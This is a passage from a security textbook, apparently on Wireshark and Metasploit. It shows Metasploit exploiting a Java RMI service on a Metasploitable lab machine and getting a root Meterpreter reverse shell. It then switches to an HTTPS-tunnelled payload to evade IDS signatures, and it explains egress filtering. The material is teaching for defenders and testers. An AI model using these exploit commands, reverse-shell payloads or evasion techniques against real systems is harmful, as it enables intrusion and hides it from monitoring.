New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:149.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Local IP:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://127.0.0.1:8080/bXh5eyC [*] Connected and sending request for http://192.168.56.106:8080/bXh5eyC/til.jar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:36.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java_rmi_server - Replied to request</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for payload</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >JAR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Sending stage (30355 bytes) to 192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Meterpreter session 7 opened (192.168.56.106:4444 -&#62; 192.168.56.103:60469) at 2014-11-11 21:08:58 -0600</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[+] Target 192.168.56.103:1099 may be exploitable&#8230; [*] Server stopped.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >meterpreter &#62; getuid</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section264" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:323.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Server username: root meterpreter &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Some additional options besides just changing the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option had to be set. Setting the local host (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) option is only necessary when using reverse shells. Using a reverse shell means you&#8217;re telling the remote host (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOST</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) to call back to the local host (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Of course, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >needs to know what system it is calling back to, hence the need for the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >information. You can think of a reverse shell plus the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option as similar to sending a self-addressed, stamped envelope. This </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option tells Metasploit what IP address the victim machine will be connecting back to.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Similar to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LHOST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >LPORT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option serves a similar purpose and informs the port number. If you enter the filter </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp.port == 4444 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >again, you will see that this time it is the victim machine connecting back to the attacker machine on port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(see<a name="_bookmark512" ></a>&nbsp;</span><span><a href="#_bookmark513" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-16</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="582"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker340518.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section265" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark513" ></a><span><a href="#_bookmark512" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-16:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Filter for tcp/4444</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:6.3500pt;" ><a name="_bookmark514" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To be clear, the attacker machine is still connecting to the victim&#8217;s </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RMI </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >port to trigger the exploit. The victim machine is still connecting to the HTTP server on port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8080</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to deliver the attack payload. The difference now is that instead of the payload creating a listening server, the payload has the victim connect back to the listening attack machine to download the rest of the Meterpreter code.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you can see, reverse shells are a powerful technique for bypassing firewalls. Reverse shells demonstrate an excellent example of why you should always apply egress filtering (filtering outbound traffic from the host) along with ingress filtering (filtering inbound traffic into the host). Firewalls should be configured so that only traffic that is necessary for business functions is allowed to either enter or leave the machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Both defensive and offensive security professionals should be familiar with network-based intrusion prevention/detection systems (IPS/IDS). Some IPS/IDS perform heuristic-based detection or detect based on strange behavior. And other IPS/IDS, similar to most antivirus, must rely on signatures (detection based on a known and defined traffic). They use deep packet inspection to check data content and search for malicious identifiers located within their signature databases. When looking at some of the data generated by Meterpreter, did you spot anything that could be used as a signature for an IPS/IDS? Hint: the strings </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >metasploit </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >meterpreter</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. These are dead ringers that something malicious is being done on the network, and virtually any IPS/IDS would trigger on these.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:10.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >How can you avoid the IPS/IDS from detecting such an obvious signature? Again, Metasploit comes to the rescue! You may have noticed there are some more Meterpreter paylod versions that haven&#8217;t been used, in particular the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java/meterpreter/reverse_https </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >payload. And from the name, you probably already guessed, this payload does not send raw TCP, but actually leverages the HTTPS-encrypted protocol to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >tunnel </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the Meterpreter traffic. Tunneled through HTTPS, the traffic is encrypted and rendered unreadable. And because IPS/IDS can only detect what it can read, tunneled traffic is not visible</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section266" ><p class=MsoBodyText  style="margin-top:4.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for inspection. Let&#8217;s review it to see what it looks like on the wire.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;line-height:17.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following output is from running the Meterpreter </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >reverse_https</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="line-height:17.0000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >payload against the victim Metasploitable machine:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set PAYLOAD java/meterpreter/reverse_https</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:152.1000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD =&#62; java/meterpreter/reverse_https msf exploit(java_rmi_server) &#62; set LPORT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444 LPORT =&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; show options</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Module options (exploit/multi/misc/java_rmi_server):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:472.7000pt;margin-left:11.2500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" ><a name="_bookmark515" ></a>Name</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Current Setting</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Required</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Description</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target address</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >1099</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target port</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 